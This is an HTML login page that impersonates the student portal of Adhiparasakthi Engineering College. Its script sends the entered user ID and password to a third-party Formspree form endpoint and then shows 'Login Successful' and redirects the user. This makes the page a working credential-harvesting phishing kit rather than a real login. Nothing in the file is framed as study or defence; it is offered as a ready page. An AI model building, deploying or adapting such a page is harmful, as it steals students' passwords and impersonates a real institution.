<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adhiparasakthi Engineering College Login</title>

<style>
body{
    margin:0;
    padding:0;
    font-family:Arial, sans-serif;
    background:linear-gradient(to right, #8b0000, #ff4d4d);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.login-box{
    background:white;
    width:360px;
    padding:25px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 5px 20px rgba(0,0,0,0.3);
}

.logo{
    width:110px;
    height:110px;
    object-fit:contain;
    margin-bottom:10px;
}

h1{
    font-size:18px;
    color:#8b0000;
    margin:5px 0;
}

p{
    font-size:13px;
    color:gray;
    margin-bottom:15px;
}

input{
    width:100%;
    padding:10px;
    margin:8px 0;
    border:1px solid #ccc;
    border-radius:8px;
    outline:none;
}

button{
    width:100%;
    padding:10px;
    background:#8b0000;
    color:white;
    border:none;
    border-radius:8px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#5c0000;
}

#msg{
    margin-top:10px;
    font-size:14px;
    color:green;
}
</style>
</head>

<body>

<div class="login-box">

    <!-- COLLEGE LOGO -->
    <img src="logo.png" alt="Adhiparasakthi Engineering College Logo" class="logo">

    <!-- TITLE -->
    <h1>Adhiparasakthi Engineering College</h1>
    <p>Student Login Portal</p>

    <!-- LOGIN FORM -->
    <form id="loginForm">
        <input type="text" name="username" placeholder="User ID" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <div id="msg"></div>

</div>

<script>
const form = document.getElementById("loginForm");
const msg = document.getElementById("msg");

form.addEventListener("submit", async function(e){
    e.preventDefault();

    const formData = new FormData(form);

    // Send data to Formspree
    const response = await fetch("https://formspree.io/f/xpqgobno", {
        method: "POST",
        body: formData,
        headers: {
            'Accept': 'application/json'
        }
    });

    if(response.ok){
        msg.style.color = "green";
        msg.innerHTML = "Login Successful ✔";

        form.reset();

        // Redirect after 2 seconds (change page if you want)
        setTimeout(() => {
            window.location.href = "home.html";
        }, 2000);

    } else {
        msg.style.color = "red";
        msg.innerHTML = "Login Failed ❌";
    }
});
</script>

</body>
</html>
